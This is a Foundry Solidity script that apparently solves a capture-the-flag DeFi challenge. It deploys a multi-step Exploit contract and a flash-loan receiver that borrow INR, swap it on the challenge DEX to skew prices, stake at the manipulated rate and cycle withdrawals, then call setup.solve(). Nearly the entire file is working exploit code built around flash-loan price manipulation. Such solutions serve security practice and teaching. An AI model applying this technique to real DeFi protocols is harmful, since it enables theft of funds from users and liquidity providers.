//SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/StdJson.sol"; 
import {Script,console} from "forge-std/Script.sol";
import "src/interfaces/IERC3156FlashBorrower.sol";
import {Setup,DEX,Finance} from "src/Setup.sol";
import {IERC20} from "@openzeppelin-contracts/token/ERC20/IERC20.sol";


contract Solve is Script{
    using stdJson for *;

    Setup setup;
    DEX dex;
    Finance finance;
    address WETH;
    address INR;
    Exploit exploit;
    function run() public{
        
        string memory Setup_path=string.concat("broadcast/DeploySetup.s.sol/", vm.toString(block.chainid), "/run-latest.json");
        try vm.readFile(Setup_path){
            string memory json = vm.readFile(Setup_path);
            address deployed = json.readAddress(".transactions[0].contractAddress");
            setup=Setup(deployed);
            dex=setup.dex();
            finance=setup.finance();
            WETH=setup.WETH();
            INR=setup.INR();
        }catch{
            revert("Challenge Not Yet Deployed");
        }

        string memory Exploit_path = string.concat("broadcast/Solve.s.sol/", vm.toString(block.chainid), "/run-latest.json");
        try vm.readFile(Exploit_path){
            string memory json = vm.readFile(Exploit_path);
            address deployed = json.readAddress(".transactions[0].contractAddress");
            exploit=Exploit(payable(deployed));
            vm.startBroadcast();
            if(exploit.state()==1){
                exploit.step2();
                exploit.changeState();
            }else if(exploit.state()==2){
                exploit.step3();
                exploit.changeState();
            }else if(exploit.state()==3){
                exploit.step4();
                exploit.changeState();
            }else if(exploit.state()==4){
                exploit.step5();
                exploit.changeState();
            }else{
                exploit.step6();
            }
            vm.stopBroadcast();
        }catch{
            vm.startBroadcast();
            exploit=new Exploit(WETH,INR,address(dex),address(finance),setup);
            exploit.step1();
            exploit.changeState();
            vm.stopBroadcast();
        }
        
        
    }

}


contract Exploit{
    address WETH;
    address INR;
    DEX dex;
    Finance public finance;
    FlashLoanReceiver flashloanReceiver;
    uint256 loan_amount=50_000 * 2_30_000 ether;
    Setup setup;
    uint8 public state;
    constructor(address _weth,address _inr,address _dex,address _finance,Setup _setup) payable {
        setup=_setup;
        WETH=_weth;
        INR=_inr;
        dex=DEX(_dex);
        finance=Finance(_finance);
    }

    function changeState()public{
        state++;
    }

    function step1()public{
        finance.snapshot();
        setup.claimBonus1();
        flashloanReceiver=new FlashLoanReceiver{value: 12_500e18}(WETH,INR,address(dex),address(finance));
        bytes memory data;
        finance.flashLoan(flashloanReceiver, INR, loan_amount, data);
        finance.snapshot();
        uint256 INR_BALANCE_AFTER_STEP1=IERC20(INR).balanceOf(address(this));
        uint256 WETH_BALANCE_AFTER_STEP1=IERC20(WETH).balanceOf(address(this));
        uint256 ETH_BALANCE_AFTER_STEP1=address(this).balance;
        console.log("WETH BALANCE AFTER STEP-1 :",WETH_BALANCE_AFTER_STEP1);
        console.log("INR BALANCE AFTER STEP-1  :",INR_BALANCE_AFTER_STEP1);
        console.log("ETH BALANCE AFTER STEP-1  :",ETH_BALANCE_AFTER_STEP1);
    }


    function step2()public{
        dex.sync();
        uint256 INR_BALANCE_DURING_STEP2=IERC20(INR).balanceOf(address(this));
        IERC20(INR).transfer(address(finance), INR_BALANCE_DURING_STEP2);
        finance.withdraw(INR,INR_BALANCE_DURING_STEP2 );
        finance.stake{value: 50_000 ether}(WETH);
        setup.claimBonus2();
        
        IERC20(WETH).transfer(address(finance), 50_000 ether);
        finance.withdraw(WETH, 50_000 ether);
        finance.stake{value:33_350 ether}(INR);

        uint256 INR_BALANCE_AFTER_STEP2=IERC20(INR).balanceOf(address(this));
        uint256 WETH_BALANCE_AFTER_STEP2=IERC20(WETH).balanceOf(address(this));
        uint256 ETH_BALANCE_AFTER_STEP2=address(this).balance;
        console.log("WETH BALANCE AFTER STEP-2 :",WETH_BALANCE_AFTER_STEP2);
        console.log("INR BALANCE AFTER STEP-2  :",INR_BALANCE_AFTER_STEP2);
        console.log("ETH BALANCE AFTER STEP-2  :",ETH_BALANCE_AFTER_STEP2);
    }

    function step3()public{
        finance.snapshot();
        uint256 _inrToTransfer=IERC20(INR).balanceOf(address(this));
        IERC20(INR).transfer(address(dex), _inrToTransfer);

        dex.swap(INR, _inrToTransfer, 0, address(this));

        finance.stake{value: 26_650 ether}(INR);

        uint256 _wethToTransfer=IERC20(WETH).balanceOf(address(this));
        IERC20(WETH).transfer(address(dex), _wethToTransfer);
        dex.swap(WETH, _wethToTransfer, 0, address(this));

        uint256 INR_BALANCE_AFTER_STEP3=IERC20(INR).balanceOf(address(this));
        uint256 WETH_BALANCE_AFTER_STEP3=IERC20(WETH).balanceOf(address(this));
        uint256 ETH_BALANCE_AFTER_STEP3=address(this).balance;
        console.log("WETH BALANCE AFTER STEP-3 :",WETH_BALANCE_AFTER_STEP3);
        console.log("INR BALANCE AFTER STEP-3  :",INR_BALANCE_AFTER_STEP3);
        console.log("ETH BALANCE AFTER STEP-3  :",ETH_BALANCE_AFTER_STEP3);
        finance.snapshot();
    }

    function step4()public{
        dex.sync();
        uint256 _inrBalanceDuringStep4=IERC20(INR).balanceOf(address(this));
        uint256 _adjustedAmount=9002 ether * 2_30_000;
        uint256 _inrToSwap_For_ETH=(_inrBalanceDuringStep4/2)-_adjustedAmount;
        IERC20(INR).transfer(address(finance),_inrToSwap_For_ETH);
        finance.withdraw(INR, _inrToSwap_For_ETH);

        uint256 INR_BALANCE_AFTER_STEP4=IERC20(INR).balanceOf(address(this));
        uint256 WETH_BALANCE_AFTER_STEP4=IERC20(WETH).balanceOf(address(this));
        uint256 ETH_BALANCE_AFTER_STEP4=address(this).balance;
        console.log("WETH BALANCE AFTER STEP-4 :",WETH_BALANCE_AFTER_STEP4);
        console.log("INR BALANCE AFTER STEP-4  :",INR_BALANCE_AFTER_STEP4);
        console.log("ETH BALANCE AFTER STEP-4  :",ETH_BALANCE_AFTER_STEP4);
    }

    function step5()public{
        finance.snapshot();
        uint256 _inrToTransfer=IERC20(INR).balanceOf(address(this));
        IERC20(INR).transfer(address(dex),_inrToTransfer);
        uint256 _amountsIn= _inrToTransfer >50_000 ether * 2_30_000?50_000 ether * 2_30_000:_inrToTransfer;
        uint256 _wethReceived=dex.swap(INR, _amountsIn, 0, address(this));
        
        uint256 _inrReceived=finance.stake{value: address(this).balance}(INR);
        console.log(_inrReceived/ (1e18*2_30_000));
        console.log(_inrReceived/2_30_000);
        IERC20(WETH).transfer(address(dex), _wethReceived);
        dex.swap(WETH, _wethReceived, 0, address(this));
        uint256 INR_BALANCE_AFTER_STEP5=IERC20(INR).balanceOf(address(this));
        uint256 WETH_BALANCE_AFTER_STEP5=IERC20(WETH).balanceOf(address(this));
        uint256 ETH_BALANCE_AFTER_STEP5=address(this).balance;
        console.log("WETH BALANCE AFTER STEP-5 :",WETH_BALANCE_AFTER_STEP5);
        console.log("INR BALANCE AFTER STEP-5  :",INR_BALANCE_AFTER_STEP5);
        console.log("ETH BALANCE AFTER STEP-5  :",ETH_BALANCE_AFTER_STEP5);
    }


    function step6()public{
        finance.snapshot();
        dex.sync();

        IERC20(INR).transfer(address(finance), 1_89_836 ether *2_30_000);
        finance.withdraw(INR, 1_89_836 ether *2_30_000);

        finance.stake{value: 1_00_000 ether}(WETH);
        uint256 INR_BALANCE_AFTER_STEP5=IERC20(INR).balanceOf(address(this));
        uint256 WETH_BALANCE_AFTER_STEP5=IERC20(WETH).balanceOf(address(this));
        uint256 ETH_BALANCE_AFTER_STEP5=address(this).balance;
        console.log("WETH BALANCE AFTER STEP-5 :",WETH_BALANCE_AFTER_STEP5);
        console.log("INR BALANCE AFTER STEP-5  :",INR_BALANCE_AFTER_STEP5);
        console.log("ETH BALANCE AFTER STEP-5  :",ETH_BALANCE_AFTER_STEP5);
        
        console.log(address(this).balance);
        setup.solve();
    }

    receive()external payable{

    }
}

contract FlashLoanReceiver is IERC3156FlashBorrower{
    uint256 public lastWethLoanReceived;
    uint256 public lastInrLoanReceived;
    address WETH;
    address INR;
    DEX dex;
    Finance public finance;
    address owner;

    constructor(address _weth,address _inr,address _dex,address _finance) payable {
        WETH=_weth;
        INR=_inr;
        dex=DEX(_dex);
        finance=Finance(_finance);
        owner=msg.sender;
    }

        

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32){
    
        IERC20(token).transfer(address(dex), amount);
        dex.swap(token, amount, 0, address(this));
        
        finance.stake{value : address(this).balance}(INR);
        uint256 _balance=IERC20(WETH).balanceOf(address(this));
        IERC20(WETH).transfer(address(dex), _balance);
        dex.swap(WETH, _balance, 0, address(this));
        
        IERC20(token).approve(msg.sender, amount);
        uint256 _balance_after_exploit=IERC20(INR).balanceOf(address(this));
        IERC20(token).transfer(owner,_balance_after_exploit-amount);
        return bytes32(data);
    }  

    receive() external payable{}

}  





